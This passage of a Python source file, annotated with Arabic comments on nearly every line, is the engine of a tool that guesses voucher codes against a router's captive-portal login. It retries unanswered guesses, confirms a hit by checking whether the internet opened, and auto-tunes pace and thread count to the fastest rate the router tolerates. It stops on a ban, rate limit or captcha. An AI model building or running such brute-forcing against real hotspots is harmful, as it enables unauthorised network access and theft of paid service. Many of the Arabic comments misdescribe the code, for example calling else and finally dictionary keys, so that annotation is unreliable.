            self.latencies.append(round(elapsed_ms))  # استدعاء self.latencies.append (معامل واحد)
            self.counters[verdict.code] += 1  # تحديث self.counters[verdict.code] بعملية جمع
            self.reason_counts[verdict.reason] += 1  # تحديث self.reason_counts[verdict.reason] بعملية جمع
            if verdict.is_hit:  # شرط: verdict.is_hit
                self._clean_streak = 0  # إسناد القيمة الثابتة self._clean_streak
            else:  # مفتاح else في القاموس
                self._clean_streak += 1  # تحديث self._clean_streak بعملية جمع

        if verdict.is_hit:  # شرط: verdict.is_hit
            self._register_hit(card, verdict)  # استدعاء self._register_hit (2 معاملات)
        elif verdict.code == "UNKNOWN":  # شرط: verdict.code يساوي 'UNKNOWN'
            self._save_unknown(card, verdict, resp)  # استدعاء self._save_unknown (3 معاملات)
        elif verdict.code == "BANNED":  # شرط: verdict.code يساوي 'BANNED'
            # كل خيط عامل يلمس هذه العدّادات، لذلك لا تُغيَّر
            # إلا أثناء حمل القفل (تحديث ضائع هنا يعني
            # صفحة حجب لا توقف التشغيل أبداً)
            ban_ev = _ban_evidence(  # إسناد نتيجة استدعاء _ban_evidence (2 معاملات، word=…، reason=…، stop=…) إلى ban_ev
                resp, self.profile.get("login_url", ""),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                word=(verdict.data or {}).get("word") or "",  # المعامل المسمّى word
                reason=verdict.reason or "", stop=True)  # المعامل المسمّى reason
            with self.lock:  # سياق مُدار: self.lock
                self._ban_count += 1  # تحديث self._ban_count بعملية جمع
                self._last_ban_evidence = ban_ev  # إسناد ban_ev إلى self._last_ban_evidence
            self._apply_delay_pressure("banned")  # استدعاء self._apply_delay_pressure (معامل واحد)
        elif verdict.code == "RATE_LIMITED":  # شرط: verdict.code يساوي 'RATE_LIMITED'
            ban_ev = _ban_evidence(  # إسناد نتيجة استدعاء _ban_evidence (2 معاملات، word=…، reason=…، stop=…) إلى ban_ev
                resp, self.profile.get("login_url", ""),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                word=(verdict.data or {}).get("word") or "",  # المعامل المسمّى word
                reason=verdict.reason or f"HTTP {getattr(resp, 'status', 0)}",  # المعامل المسمّى reason
                stop=True)  # المعامل المسمّى stop
            with self.lock:  # سياق مُدار: self.lock
                self._rate_count += 1  # تحديث self._rate_count بعملية جمع
                self._last_ban_evidence = ban_ev  # إسناد ban_ev إلى self._last_ban_evidence
            self._apply_delay_pressure("rate_limited", resp)  # استدعاء self._apply_delay_pressure (2 معاملات)
        elif verdict.code == "CHALLENGE":  # شرط: verdict.code يساوي 'CHALLENGE'
            ban_ev = _ban_evidence(  # إسناد نتيجة استدعاء _ban_evidence (2 معاملات، reason=…، stop=…) إلى ban_ev
                resp, self.profile.get("login_url", ""),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                reason="captcha_challenge", stop=True)  # المعامل المسمّى reason
            with self.lock:  # سياق مُدار: self.lock
                self._last_ban_evidence = ban_ev  # إسناد ban_ev إلى self._last_ban_evidence
            self.stop("captcha_challenge")  # استدعاء self.stop (معامل واحد)

        with self.lock:  # سياق مُدار: self.lock
            row = {"card": card, "code": verdict.code, "reason": verdict.reason,  # إسناد قاموس إلى row
                   "time": time.strftime("%H:%M:%S")}  # مفتاح time في القاموس
            self._recent.append(row)  # استدعاء self._recent.append (معامل واحد)
            # كل بطاقة أُرسلت منذ آخر فحص «هل ما زلنا خلف الجدار؟»
            # مشتبه بها؛ عند 200 بطاقة/ثانية فإن مخزناً ثابت الحجم سيرمي
            # البطاقة العاملة قبل أن ننظر إليها أصلاً
            self._since_check.append(row)  # استدعاء self._since_check.append (معامل واحد)
            if verdict.code in ("BANNED", "RATE_LIMITED", "CHALLENGE"):
                # الراوتر رفض الحكم على هذه البطاقة أو طلب كابتشا: لم تُختبر بعد،
                # لذلك يجب ألا تُعلَّم كمغطّاة
                self._unevaluated += 1  # تحديث self._unevaluated بعملية جمع
        self._emit_attempt(card, resp, verdict, sent_index)  # استدعاء self._emit_attempt (4 معاملات)
        self._maybe_decay_delay()  # استدعاء self._maybe_decay_delay
        self._auto_pace(verdict.code)  # استدعاء self._auto_pace (معامل واحد)
        self._check_stop_rules()  # استدعاء self._check_stop_rules

    def _retry_later(self, card: str, sent_index: int) -> bool:  # تعريف الدالة _retry_later(self, card, sent_index) ترجع bool
        # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
        """Remember a card we never got an answer for, and ask again later.

        A request can die on the way (a socket the router closed, a reply that
        came after our timeout).  The router may well have taken it, so the
        card is not "tested" yet - a run must not move on and leave the one
        card that works unasked.  Bounded: `config.MAX_CARD_RETRIES` extra
        tries per card, handed back to the queue by `_finish_retries`.
        """  # نهاية النص متعدد الأسطر
        with self.lock:  # سياق مُدار: self.lock
            if self.stop_event.is_set():  # شرط: نتيجة self.stop_event.is_set()
                return False  # إرجاع False
            tries = self._retried.get(card, 0)  # إسناد نتيجة استدعاء self._retried.get (2 معاملات) إلى tries
            if tries >= config.MAX_CARD_RETRIES:  # شرط: tries أكبر أو يساوي config.MAX_CARD_RETRIES
                return False  # إرجاع False
            self._retried[card] = tries + 1  # حساب جمع بين tries و1 وإسناده إلى self._retried[card]
            self._pending.append((card, sent_index, True))  # استدعاء self._pending.append (معامل واحد)
        return True  # إرجاع True

    def _finish_retries(self, task_q) -> None:  # تعريف الدالة _finish_retries(self, task_q) ترجع None
        # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
        """Hand the cards that got no answer back to the workers.

        This runs after every card of the plan was queued: the workers are
        still running, so the queue cannot stay full - a blocking put is safe
        here, while a `put_nowait` inside a worker would silently lose the
        card whenever the queue happens to be full.
        """  # نهاية النص متعدد الأسطر
        for _ in range(config.MAX_CARD_RETRIES + 1):  # دورة على range(جمع) باسم _
            # انتظر أولاً كل ما هو في الطابور الآن. البطاقة الفاشلة قد
            # تضيف نفسها إلى _pending في أي لحظة أثناء تفريغ الخطة
            # الأصلية؛ والنظر إلى _pending أولاً سباقٌ وكان يضيّع
            # تحديداً الإخفاقات المتأخرة قرب نهاية التشغيل.
            deadline = time.time() + 30  # حساب جمع بين time.time() و30 وإسناده إلى deadline
            while time.time() < deadline and not self.stop_event.is_set():  # حلقة ما دام مقارنة و نفي/سالب
                if not getattr(task_q, "unfinished_tasks", 0):  # شرط معكوس: ليس getattr(task_q, 'unfinished_tasks', 0)
                    break  # قطع الحلقة فوراً
                time.sleep(0.02)  # استدعاء time.sleep (معامل واحد)
            with self.lock:  # سياق مُدار: self.lock
                pending, self._pending = list(self._pending), []  # إسناد مجموعة إلى مجموعة
            if not pending:  # شرط معكوس: ليس pending
                return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
            for item in pending:  # دورة على pending باسم item
                while not self.stop_event.is_set():  # حلقة ما دام نفي/سالب
                    try:  # بدايةtry محمية (يليها except/finally)
                        task_q.put(item, timeout=0.2)  # استدعاء task_q.put (معامل واحد، timeout=…)
                        break  # قطع الحلقة فوراً
                    except queue.Full:  # تكملة السطر السابق داخل القوس
                        continue  # الانتقال إلى الدورة التالية
                else:  # مفتاح else في القاموس
                    # التشغيل أُوقف: هذه البطاقات تبقى غير مُختبَرة
                    with self.lock:  # سياق مُدار: self.lock
                        self._unevaluated += 1  # تحديث self._unevaluated بعملية جمع
        # «لا إجابة» أخيرة قد تكون أضافت نفسها في آخر إعادة مسموحة.
        # أبقِها صراحةً غير مُختبَرة للتشغيل التالي.
        with self.lock:  # سياق مُدار: self.lock
            self._unevaluated += len(self._pending)  # تحديث self._unevaluated بعملية جمع
            self._pending = []  # إسناد قائمة إلى self._pending

    # التحقق من إصابة: إن كان الجهاز ONLINE أصلاً ففحص الإنترنت لا يثبت شيئاً.
    def _verify_hit(self, sess, verdict: Verdict, card: str) -> Verdict:  # تعريف الدالة _verify_hit(self, sess, verdict, card) ترجع Verdict
        # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
        """A hit is only final when the card really opened the internet.

        If the machine was already online before we sent any card, an internet
        check cannot prove anything - then the verdict stays ACCEPTED and the
        reason says exactly that, instead of faking certainty.
        """  # نهاية النص متعدد الأسطر
        already_online = (self._internet_before or {}).get("state") == "ONLINE"  # مقارنة (يساوي) وإسناد النتيجة المنطقية إلى already_online
        if already_online:  # شرط: already_online
            status = verify.portal_status_page(sess, self.profile["login_url"])  # إسناد نتيجة استدعاء verify.portal_status_page (2 معاملات) إلى status
            return Verdict("ACCEPTED", "accepted_internet_already_open",  # إرجاع Verdict('ACCEPTED', 'accepted_internet_already_open', min(verdict.confidence, 0.85), data=قاموس, evidence=قاموس)
                           min(verdict.confidence, 0.85),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                           data={**verdict.data,  # المعامل المسمّى data
                                 "internet": "SKIPPED_ALREADY_ONLINE",  # مفتاح internet في القاموس
                                 "status_page": status.get("looks_logged_in", False)},  # مفتاح status_page في القاموس
                           evidence={**verdict.evidence, "status_page": status})  # المعامل المسمّى evidence
        # التأكيد نفسه طلب شبكي. إن مات (مقبس أسقطه الراوتر
        # وهو يسلّمنا) فالبطاقة نفسها ما زالت مقبولة: قل
        # «مقبولة، غير مؤكدة» بدل رمي الإصابة — وإضاعة إصابة هي
        # الشيء الوحيد الذي يجب ألا تفعله هذه الأداة أبداً.
        try:  # بدايةtry محمية (يليها except/finally)
            ok, info = verify.verify_online(sess, checks=self.checks)  # إسناد نتيجة استدعاء verify.verify_online (معامل واحد، checks=…) إلى مجموعة
        # تكملة السطر السابق داخل القوس
        except Exception as exc:                       # noqa: BLE001
            ok, info = False, {"state": "", "detail": f"{type(exc).__name__}",  # إسناد مجموعة إلى مجموعة
                               "status": 0, "location": "", "url": ""}  # مفتاح status في القاموس
        try:  # بدايةtry محمية (يليها except/finally)
            status = verify.portal_status_page(sess, self.profile["login_url"])  # إسناد نتيجة استدعاء verify.portal_status_page (2 معاملات) إلى status
        # تكملة السطر السابق داخل القوس
        except Exception as exc:                       # noqa: BLE001
            status = {"checked": False, "reason": type(exc).__name__,  # إسناد قاموس إلى status
                      "looks_logged_in": False}  # مفتاح looks_logged_in في القاموس
        v = Verdict("ACCEPTED_VERIFIED" if ok else verdict.code,  # إسناد نتيجة استدعاء Verdict (3 معاملات، data=…، evidence=…) إلى v
                    "redirect_out_of_portal_and_online" if ok else verdict.reason,  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                    1.0 if ok else verdict.confidence,  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                    data={**verdict.data, "internet": info.get("state", ""),  # المعامل المسمّى data
                          "internet_detail": info.get("detail", ""),  # مفتاح internet_detail في القاموس
                          "status_page": status.get("looks_logged_in", False)},  # مفتاح status_page في القاموس
                    evidence={**verdict.evidence, "internet": info,  # المعامل المسمّى evidence
                              "status_page": status})  # مفتاح status_page في القاموس
        if not ok and verdict.code == "ACCEPTED":  # شرط مركّب (و)
            v.code = "ACCEPTED_UNVERIFIED"  # إسناد القيمة الثابتة v.code
        return v  # إرجاع v

    # يسجّل الإصابة في الذاكرة وفي hits.txt ويبثّ الحدث.
    # ACCEPTED_VERIFIED يوقف التشغيل بلا شرط: الإرسال لبوابة مفتوحة قد يولّد
    # تحققات كاذبة لنفس البطاقات التالية.
    def _register_hit(self, card: str, verdict: Verdict) -> None:  # تعريف الدالة _register_hit(self, card, verdict) ترجع None
        hit = {"card": card, "code": verdict.code, "reason": verdict.reason,  # إسناد قاموس إلى hit
               "confidence": verdict.confidence, "time": time.strftime("%H:%M:%S"),  # مفتاح confidence في القاموس
               "data": verdict.data}  # مفتاح data في القاموس
        with self.lock:  # سياق مُدار: self.lock
            self.hits.append(hit)  # استدعاء self.hits.append (معامل واحد)
        self.store.append_hit(f"{time.strftime('%Y-%m-%d %H:%M:%S')} card={card} "  # استدعاء self.store.append_hit (معامل واحد)
                              f"code={verdict.code} reason={verdict.reason} "  # تكملة السطر السابق داخل القوس
                              f"{json.dumps(verdict.data, ensure_ascii=False)[:200]}")  # تكملة السطر السابق داخل القوس
        self.emit("hit", hit)  # استدعاء self.emit (2 معاملات)
        strong = (verdict.code == "ACCEPTED_VERIFIED"  # دمج منطقي (أو) وإسناده إلى strong
                  or verdict.confidence >= 0.85)  # تكملة السطر السابق داخل القوس
        # بمجرد تأكيد فتح الإنترنت، توقّف بلا شرط: أي محاولة
        # بيانات دخول أخرى ستجري على بوابة مشتركة مفتوحة أصلاً
        # وقد «تُتحقق» زوراً بسبب نفس الانتقال الشبكي.
        if verdict.code == "ACCEPTED_VERIFIED":  # شرط: verdict.code يساوي 'ACCEPTED_VERIFIED'
            self.stop("found_verified")  # استدعاء self.stop (معامل واحد)
        elif self.auto_stop and strong:  # شرط مركّب (و)
            self.stop("found_strong_evidence")  # استدعاء self.stop (معامل واحد)

    def _save_unknown(self, card: str, verdict: Verdict, resp) -> None:  # تعريف الدالة _save_unknown(self, card, verdict, resp) ترجع None
        with self.lock:  # سياق مُدار: self.lock
            if self._unknown_saved >= 50:  # شرط: self._unknown_saved أكبر أو يساوي 50
                return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
            self._unknown_saved += 1  # تحديث self._unknown_saved بعملية جمع
        saved = self.store.save_review(self.seq, card, verdict.as_dict(),  # إسناد نتيجة استدعاء self.store.save_review (4 معاملات) إلى saved
                                       resp.text or "")  # تكملة السطر السابق داخل القوس
        if saved:  # شرط: saved
            with self.lock:  # سياق مُدار: self.lock
                self.review.append(saved)  # استدعاء self.review.append (معامل واحد)
            self.emit("review", saved)  # استدعاء self.emit (2 معاملات)

    def _emit_attempt(self, card, resp, verdict: Verdict, idx: int) -> None:  # تعريف الدالة _emit_attempt(self, card, resp, verdict, idx) ترجع None
        interesting = verdict.code != "REJECTED"  # مقارنة (لا يساوي) وإسناد النتيجة المنطقية إلى interesting
        with self.lock:  # سياق مُدار: self.lock
            self._rejected_since_emit += 1  # تحديث self._rejected_since_emit بعملية جمع
            quiet = self._rejected_since_emit  # إسناد self._rejected_since_emit إلى quiet
        if not interesting and quiet < 25:  # شرط مركّب (و)
            self._emit_stats()  # استدعاء self._emit_stats
            return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
        with self.lock:  # سياق مُدار: self.lock
            self._rejected_since_emit = 0  # إسناد القيمة الثابتة self._rejected_since_emit
        self.emit("attempt", {  # استدعاء self.emit (2 معاملات)
            "card": card, "code": verdict.code, "reason": verdict.reason,  # مفتاح card في القاموس
            "data": verdict.data, "status": resp.status,  # مفتاح data في القاموس
            "ms": round(resp.elapsed_ms), "length": resp.length,  # مفتاح ms في القاموس
            "location": resp.location[:120], "index": idx,  # مفتاح location في القاموس
        })  # إغلاق القوس المفتوح في السطر السابق
        self._emit_stats()  # استدعاء self._emit_stats

    def _emit_net_error(self, kind: str, card: str, err) -> None:  # تعريف الدالة _emit_net_error(self, kind, card, err) ترجع None
        with self.lock:  # سياق مُدار: self.lock
            self.counters["NET_ERROR"] += 1  # تحديث self.counters['NET_ERROR'] بعملية جمع
            self.reason_counts[kind] += 1  # تحديث self.reason_counts[kind] بعملية جمع
        self.emit("attempt", {"card": card, "code": "NET_ERROR", "reason": kind,  # استدعاء self.emit (2 معاملات)
                              "data": {"text": (err.text if err else "")[:160]},  # مفتاح data في القاموس
                              "status": 0, "ms": 0, "length": 0})  # مفتاح status في القاموس
        self._emit_stats()  # استدعاء self._emit_stats

    def _emit_stats(self) -> None:  # تعريف الدالة _emit_stats(self) ترجع None
        now = time.time()  # إسناد نتيجة استدعاء time.time إلى now
        if now - self._last_event_at < 0.4:  # شرط: طرح أصغر من 0.4
            return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
        self._last_event_at = now  # إسناد now إلى self._last_event_at
        self.emit("stats", self.status_snapshot())  # استدعاء self.emit (2 معاملات)

    def _covered_now(self, processed: int) -> int:
        """Return the unique, judged cards covered in this run so far.

        Retry requests do not add coverage, nor do cards the router refused to
        judge or cards still waiting for a retry. Call while holding ``self.lock``.
        """
        unique_done = max(
            0, int(processed) - self._retry_processed - self._unevaluated
            - len(self._pending))
        covered = max(0, self._run_start_pos) + unique_done
        space = int(self.progress.get("space") or 0)
        return min(covered, space) if space else covered

    def status_snapshot(self) -> dict:  # تعريف الدالة status_snapshot(self) ترجع dict
        with self.lock:  # سياق مُدار: self.lock
            progress = dict(self.progress)
            progress["covered"] = self._covered_now(sum(self.counters.values()))
            return {"counters": dict(self.counters),  # إرجاع قاموس
                    "reason_counts": dict(self.reason_counts),  # مفتاح reason_counts في القاموس
                    "net_kinds": dict(self.net_kinds),  # مفتاح net_kinds في القاموس
                    "progress": progress,  # مفتاح progress في القاموس
                    "speed": round(self.speed, 1),  # مفتاح speed في القاموس
                    "delay_ms": self.throttle["delay_ms"],  # مفتاح delay_ms في القاموس
                    "throttle_reason": self.throttle["reason"]}  # مفتاح throttle_reason في القاموس

    # -- التحكم في التدفق ----------------------------------------------------
    def _apply_delay_pressure(self, reason: str, resp=None) -> None:  # تعريف الدالة _apply_delay_pressure(self, reason, resp) ترجع None
        """Slow down on purpose and say why. Never slow down silently."""  # نص توثيقي (docstring) يشرح ما يليه
        with self.lock:  # سياق مُدار: self.lock
            base = self.throttle["base_ms"]  # إسناد self.throttle['base_ms'] إلى base
            current = self.throttle["delay_ms"]  # إسناد self.throttle['delay_ms'] إلى current
            cap = 2000  # إسناد القيمة الثابتة cap
            if reason == "rate_limited":  # شرط: reason يساوي 'rate_limited'
                wait = _retry_after(resp) if resp is not None else 0  # إسناد _retry_after(resp) إن مقارنة وإلا 0 إلى wait
                new = max(current + 250, min(cap, base + 400), min(wait * 1000, cap))  # إسناد نتيجة استدعاء max (3 معاملات) إلى new
                note = "rate_limited_slowing_down"  # إسناد القيمة الثابتة note
            elif reason == "banned":  # شرط: reason يساوي 'banned'
                new = min(cap, max(current + 400, 800))  # إسناد نتيجة استدعاء min (2 معاملات) إلى new
                note = "ban_page_slowing_down"  # إسناد القيمة الثابتة note
            elif reason in ("refused", "reset"):  # شرط: reason ضمن مجموعة
                new = min(cap, current + 75)  # إسناد نتيجة استدعاء min (2 معاملات) إلى new
                note = "connections_refused_slowing_down"  # إسناد القيمة الثابتة note
            elif current < 1000:      # عثرات عابرة: نبّه، لا تُغرق
                new = current + 25  # حساب جمع بين current و25 وإسناده إلى new
                note = "network_errors_slowing_down"  # إسناد القيمة الثابتة note
            else:  # مفتاح else في القاموس
                new = current  # إسناد current إلى new
                note = "network_errors_slowing_down"  # إسناد القيمة الثابتة note
            self.throttle["delay_ms"] = int(new)  # إسناد نتيجة استدعاء int (معامل واحد) إلى self.throttle['delay_ms']
            self.throttle["reason"] = note  # إسناد note إلى self.throttle['reason']
            self.throttle["events"].append({"t": round(time.time(), 1),  # استدعاء self.throttle['events'].append (معامل واحد)
                                            "reason": note,  # مفتاح reason في القاموس
                                            "delay_ms": int(new)})  # مفتاح delay_ms في القاموس
        self.emit("throttle", {"reason": note, "delay_ms": int(new)})  # استدعاء self.emit (2 معاملات)

    def _maybe_decay_delay(self) -> None:  # تعريف الدالة _maybe_decay_delay(self) ترجع None
        """Restore the configured delay after sustained clean responses."""  # نص توثيقي (docstring) يشرح ما يليه
        base = self.throttle["base_ms"]  # إسناد self.throttle['base_ms'] إلى base
        with self.lock:  # سياق مُدار: self.lock
            current = self.throttle["delay_ms"]  # إسناد self.throttle['delay_ms'] إلى current
            if current <= base or self._clean_streak < 150:  # شرط مركّب (أو)
                return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
            new = max(base, int(current * 0.6))  # إسناد نتيجة استدعاء max (2 معاملات) إلى new
            self._clean_streak = 0  # إسناد القيمة الثابتة self._clean_streak
            self.throttle["delay_ms"] = new  # إسناد new إلى self.throttle['delay_ms']
            self.throttle["reason"] = "recovering_speed" if new > base else ""  # إسناد 'recovering_speed' إن مقارنة وإلا '' إلى self.throttle['reason']
        self.emit("throttle", {"reason": "recovering_speed", "delay_ms": new})  # استدعاء self.emit (2 معاملات)

    # -- إيجاد أسرع وتيرة يسمح بها هذا الراوتر فعلاً -------------
    # ضبط الوتيرة AIMD: زيادة جمعية عند النظافة، نقصان مضاعف عند الشكوى.
    def _auto_pace(self, code: str) -> None:  # تعريف الدالة _auto_pace(self, code) ترجع None
        # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
        """Additive increase / multiplicative decrease, the way TCP does it.

        Every few seconds we look at what came back: if the router answered
        cleanly we ask a little more of it (shorter delay, then extra hands);
        the moment it answers with errors, rate-limit pages or block pages we
        halve the rate.  The result is the best pace *this* router allows,
        found while the run is going - and the page says what it is doing.
        """  # نهاية النص متعدد الأسطر
        if not config.AUTO_PACE or self._verification_serialized:  # شرط مركّب (أو)
            return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
        now = time.time()  # إسناد نتيجة استدعاء time.time إلى now
        with self.lock:  # سياق مُدار: self.lock
            w = self._pace  # إسناد self._pace إلى w
            w["n"] += 1  # تحديث w['n'] بعملية جمع
            if code in ("REJECTED", "ACCEPTED", "ACCEPTED_VERIFIED",  # شرط: code ضمن مجموعة
                        "ACCEPTED_UNVERIFIED"):  # تكملة تعريف متعدد الأسطر
                w["ok"] += 1  # تحديث w['ok'] بعملية جمع
            else:  # مفتاح else في القاموس
                w["bad"] += 1  # تحديث w['bad'] بعملية جمع
            if now - w["t"] < config.PACE_WINDOW_SECONDS or w["n"] < 8:  # شرط مركّب (أو)
                return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
            total, bad = w["n"], w["bad"]  # إسناد مجموعة إلى مجموعة
            delay, base = self.throttle["delay_ms"], self.throttle["base_ms"]  # إسناد مجموعة إلى مجموعة
            self._pace = {"t": now, "n": 0, "ok": 0, "bad": 0}  # إسناد قاموس إلى self._pace
        ratio = bad / max(total, 1)  # حساب قسمة بين bad وmax(total, 1) وإسناده إلى ratio
        if ratio > config.PACE_BAD_RATIO:  # شرط: ratio أكبر من config.PACE_BAD_RATIO
            new = min(config.PACE_MAX_DELAY_MS, max(delay * 2, 120))  # إسناد نتيجة استدعاء min (2 معاملات) إلى new
            note = "auto_slowed_router_complaining"  # إسناد القيمة الثابتة note
        elif ratio == 0 and delay <= base:  # شرط مركّب (و)
            added = self._add_workers(2)  # إسناد نتيجة استدعاء self._add_workers (معامل واحد) إلى added
            if not added:  # شرط معكوس: ليس added
                return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
            note = "auto_sped_up_more_threads"  # إسناد القيمة الثابتة note
            new = delay  # إسناد delay إلى new
        elif ratio <= 0.01 and delay > base:  # شرط مركّب (و)
            new = max(base, int(delay * 0.7))  # إسناد نتيجة استدعاء max (2 معاملات) إلى new
            note = "auto_sped_up"  # إسناد القيمة الثابتة note
        else:  # مفتاح else في القاموس
            return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
        with self.lock:  # سياق مُدار: self.lock
            self.throttle["delay_ms"] = int(new)  # إسناد نتيجة استدعاء int (معامل واحد) إلى self.throttle['delay_ms']
            self.throttle["reason"] = note  # إسناد note إلى self.throttle['reason']
            self.throttle["events"].append({"t": round(now, 1), "reason": note,  # استدعاء self.throttle['events'].append (معامل واحد)
                                            "delay_ms": int(new)})  # مفتاح delay_ms في القاموس
            threads = len((self._pool or {}).get("threads", []))  # إسناد نتيجة استدعاء len (معامل واحد) إلى threads
        self.emit("throttle", {"reason": note, "delay_ms": int(new),  # استدعاء self.emit (2 معاملات)
                               "threads": threads})  # مفتاح threads في القاموس

    def _add_workers(self, count: int) -> int:  # تعريف الدالة _add_workers(self, count) ترجع int
        """Give the run more hands - only when the router is answering cleanly."""  # نص توثيقي (docstring) يشرح ما يليه
        pool = getattr(self, "_pool", None)  # إسناد نتيجة استدعاء getattr (3 معاملات) إلى pool
        if not pool:  # شرط معكوس: ليس pool
            return 0  # إرجاع 0
        cap = min(config.PACE_MAX_THREADS, max(4, pool["started"] * 2))  # إسناد نتيجة استدعاء min (2 معاملات) إلى cap
        added = 0  # إسناد القيمة الثابتة added
        for _ in range(count):  # دورة على range(count) باسم _
            with self.lock:  # سياق مُدار: self.lock
                if len(pool["threads"]) >= cap:  # شرط: len(pool['threads']) أكبر أو يساوي cap
                    break  # قطع الحلقة فوراً
                t = threading.Thread(target=pool["worker"], daemon=True,  # إسناد نتيجة استدعاء threading.Thread (target=…، daemon=…، name=…) إلى t
                                     name=f"kirapass-wx{len(pool['threads'])}")  # المعامل المسمّى name
                pool["threads"].append(t)  # استدعاء pool['threads'].append (معامل واحد)
            t.start()  # استدعاء t.start
            added += 1  # تحديث added بعملية جمع
        return added  # إرجاع added

    # -- «هل نزل الجدار؟» -----------------------------------------
    # المراقب: يفحص الإنترنت كل 3 ثوانٍ أثناء التشغيل.
    # يعمل فقط إن بدأنا خلف الجدار؛ عند ONLINE ينسخ البطاقات الأخيرة كمشتبه بها.
    def _start_watchdog(self) -> None:  # تعريف الدالة _start_watchdog(self) ترجع None
        # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
        """Watch the internet while the run is going.

        Some routers log the guest in and still answer with the rejection
        page, so a hit can slip past the judge entirely.  The internet itself
        cannot lie: when it opens mid-run, one of the cards we just sent did
        it, and those cards are handed to the user as suspects.
        """  # نهاية النص متعدد الأسطر
        if not (config.WATCH_INTERNET and self.verify_enabled):  # شرط معكوس: ليس config.WATCH_INTERNET و self.verify_enabled
            return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
        if (self._internet_before or {}).get("state") != "WALLED":  # شرط: self._internet_before أو قاموس.get('state') لا يساوي 'WALLED'
            return          # متصل أصلاً (أو منقطع): لا يثبت شيئاً
        checks = self.checks  # إسناد self.checks إلى checks

        def watch():  # تعريف الدالة watch()
            sess = new_session()  # إسناد نتيجة استدعاء new_session إلى sess
            try:  # بدايةtry محمية (يليها except/finally)
                while not self.stop_event.wait(config.WATCH_EVERY_SECONDS):  # حلقة ما دام نفي/سالب
                    try:  # بدايةtry محمية (يليها except/finally)
                        state = verify.probe_internet(sess, checks=checks)["state"]  # إسناد verify.probe_internet(sess, checks=checks)['state'] إلى state
                    # تكملة السطر السابق داخل القوس
                    except Exception:                       # noqa: BLE001
                        continue  # الانتقال إلى الدورة التالية
                    with self.lock:  # سياق مُدار: self.lock
                        if state == "ONLINE":  # شرط: state يساوي 'ONLINE'
                            suspects = list(self._since_check)  # إسناد نتيجة استدعاء list (معامل واحد) إلى suspects
                        else:  # مفتاح else في القاموس
                            suspects = None  # إسناد القيمة الثابتة suspects
                            self._since_check = []   # ولا واحدة من هذه فعلتها
                    if suspects is not None and not self._internet_opened:  # شرط مركّب (و)
                        with self.lock:  # سياق مُدار: self.lock
                            self._internet_opened = {  # إسناد قاموس إلى self._internet_opened
                                "at": time.strftime("%H:%M:%S"),  # مفتاح at في القاموس
                                "suspects": suspects,  # مفتاح suspects في القاموس
                            }  # إغلاق القوس المفتوح في السطر السابق
                        self.emit("internet_opened",  # استدعاء self.emit (2 معاملات)
                                  {"at": self._internet_opened["at"],  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                                   "suspects": suspects,  # مفتاح suspects في القاموس
                                   "count": len(suspects)})  # مفتاح count في القاموس
                        self.stop("internet_opened")  # استدعاء self.stop (معامل واحد)
                        return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
            finally:  # مفتاح finally في القاموس
                sess.close()  # استدعاء sess.close

        self._watch_thread = threading.Thread(  # إسناد نتيجة استدعاء threading.Thread (target=…، daemon=…، name=…) إلى self._watch_thread
            target=watch, daemon=True, name="kirapass-watchdog")  # المعامل المسمّى target
        self._watch_thread.start()  # استدعاء self._watch_thread.start

    # قواعد التوقف الأخلاقية: حجب واحد، تقييد واحد، كابتشا واحدة ⇒ توقف.
    # وثلاثة إخفاقات نقل متتالية أو انفجار 20 خطأ ⇒ target_unreachable.
    def _check_stop_rules(self) -> None:  # تعريف الدالة _check_stop_rules(self) ترجع None
        """Stop only for reasons we can explain."""  # نص توثيقي (docstring) يشرح ما يليه
        counters = self.counters  # إسناد self.counters إلى counters
        errors = counters.get("NET_ERROR", 0)  # إسناد نتيجة استدعاء counters.get (2 معاملات) إلى errors
        attempts = sum(counters.values())  # إسناد نتيجة استدعاء sum (معامل واحد) إلى attempts
        if errors >= config.BURST_LIMIT and errors >= attempts * 0.8:  # شرط مركّب (و)
            self.stop("target_unreachable")  # استدعاء self.stop (معامل واحد)
        # عامل أول ردّ حجب/تقييد صريح من الراوتر كتوقّف
        # قاطع. لا تنتظر زواله أبداً ولا تستأنف الفحص تلقائياً.
        if self._ban_count >= 1:  # شرط: self._ban_count أكبر أو يساوي 1
            self.stop("banned_by_router")  # استدعاء self.stop (معامل واحد)
            return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
        if self._rate_count >= 1:  # شرط: self._rate_count أكبر أو يساوي 1
            self.stop("rate_limited_by_router")  # استدعاء self.stop (معامل واحد)
            return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
        if counters.get("CHALLENGE", 0) >= 1:  # شرط: counters.get('CHALLENGE', 0) أكبر أو يساوي 1
            self.stop("captcha_challenge")  # استدعاء self.stop (معامل واحد)

    # -- التقرير ----------------------------------------------------------
    def _save_report(self) -> None:  # تعريف الدالة _save_report(self) ترجع None
        status = self.status()  # إسناد نتيجة استدعاء self.status إلى status
        report = {  # إسناد قاموس إلى report
            "tool": config.APP_NAME, "version": config.VERSION,  # مفتاح tool في القاموس
            "finished": time.strftime("%Y-%m-%d %H:%M:%S"),  # مفتاح finished في القاموس
            "profile": self.profile.get("name", ""),  # مفتاح profile في القاموس
            "login_url": self.profile.get("login_url", ""),  # مفتاح login_url في القاموس
